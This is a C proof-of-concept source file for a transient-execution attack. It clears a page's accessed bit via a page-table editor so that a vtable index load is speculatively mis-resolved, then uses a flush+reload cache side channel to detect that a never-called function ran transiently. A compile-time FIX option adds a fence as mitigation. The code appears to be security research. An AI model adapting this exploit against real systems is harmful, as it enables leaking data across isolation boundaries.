#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <immintrin.h>

#include "cacheutils.h"

//#define FIX

#include "ptedit_header.h"

#define ITERATIONS 10000
#define SPACING 4096

__attribute__((aligned(4096)))
char probe[256 * 4096];

typedef struct {
  void(*entry0)();
  void(*entry1)();
} vtable_t;

vtable_t victim_vt;

void func_always_called() {
  maccess(probe + 0 * SPACING);
}

void func_never_called() {
  maccess(probe + 0x42 * SPACING);
}

__attribute__((aligned(4096)))
int vtable_idx[1024];

void init_victim() {
  vtable_idx[0] = 1;
  victim_vt.entry0 = func_never_called;
  victim_vt.entry1 = func_always_called;
}


void access_vtable(int* vtable_idx) {
  asm volatile(INTELASM(
    // load vtable ptr
    "xor edi, edi\n\t"
    "adox edi, [rbx]\n\t"
#ifdef FIX
    "mfence\n\t"
#endif
    "shl rdi, 3\n\t" // * 8

    // access vtable
    "call [rax + rdi]\n\t"
  ) : : "a"(&victim_vt), "b"(vtable_idx) : "rdi", "rsi", "memory");
}

void run_victim() {
  access_vtable(&vtable_idx);
}

void prepare() {
  for (size_t i = 0; i < 256; i++) {
    flush(probe + i * SPACING);
  }
  mfence();
}

void recover() {
  int hits = 0;
  for (size_t i = 0; i < 256; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(probe + idx * SPACING);
      if (delta < CACHE_MISS) {
        if (idx == 0x42) {
          printf("SUCCESS!\n");
          printf("Wrong member function was called!\n");
          exit(0);
        }
        hits++;
      }
    }
}

void attack() {
  ptedit_pte_clear_bit(vtable_idx, 0, PTEDIT_PAGE_BIT_ACCESSED);
}

void init() {
  // touch memory to make sure its mapped
  memset(probe, 1, sizeof(probe));

  CACHE_MISS = detect_flush_reload_threshold() + 10;
  printf("Cache miss @ %zd\n", CACHE_MISS);

  if (ptedit_init()) {
    printf("PTEditor: init error. Aborting\n");
    exit(1);
  }

  init_victim();
}

int main(int argc, char* argv[]) {
  init();

  for (size_t iter = 0; iter < ITERATIONS; iter++) {
    prepare();
    for (int i = 0; i < 1000; i++) {
      attack();
      run_victim();
    }
    printf("i: %d\n", iter);
    recover();
  }  // iterations
  exit(EXIT_SUCCESS);
}
